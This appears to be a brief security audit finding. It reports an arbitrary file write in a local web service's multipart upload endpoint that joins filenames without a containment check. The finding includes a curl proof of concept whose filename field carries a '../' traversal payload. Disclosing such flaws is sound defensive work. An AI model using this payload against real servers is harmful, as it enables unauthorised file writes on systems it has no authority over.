# Multipart filename traversal arbitrary file write

**Verification: CODE-VERIFIED**

## Description
File upload endpoint joins multipart filename with target path without containment. Sibling endpoint correctly uses basename(), proving the omission is an oversight.

## Impact
Local process or malicious web page (multipart = CORS simple request, no preflight) writes files at arbitrary paths via ../ traversal.

## PoC
```bash
curl -X POST http://localhost:8000/api/v1/files/upload -F "file=@payload.txt;filename=../../tmp/escaped.txt"
```

## Execution result
```
Code path analysis: os.path.join(target_dir, filename) without realpath/commonpath.
Sibling handler uses basename(). No auth on the endpoint.
```
